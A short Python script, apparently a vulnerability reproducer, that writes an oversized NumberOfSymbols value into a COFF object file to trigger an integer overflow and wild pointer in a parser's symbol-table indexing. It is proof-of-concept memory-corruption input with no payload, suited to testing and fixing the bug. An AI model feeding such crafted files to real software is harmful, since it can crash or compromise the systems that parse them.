#!/usr/bin/env python3
"""NumberOfSymbols is validated only for < 0.  Pass 1/2/5 then index the symbol
table with `i * COFF_SYMESZ` in *int* arithmetic, which overflows once
i > INT_MAX/18 = 119304647, producing a wild pointer.
Usage: t_nsyms_overflow.py <seed.o> <out.o> [nsyms]"""
import sys, struct
src, dst = sys.argv[1], sys.argv[2]
n = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x08000000
b = bytearray(open(src, 'rb').read())
struct.pack_into('<I', b, 12, n)          # NumberOfSymbols
open(dst, 'wb').write(bytes(b))
print("nsyms=%d (0x%x); symtab alloc=%d bytes; int overflow of i*18 at i=%d"
      % (n, n, n*18, (2**31)//18 + 1))
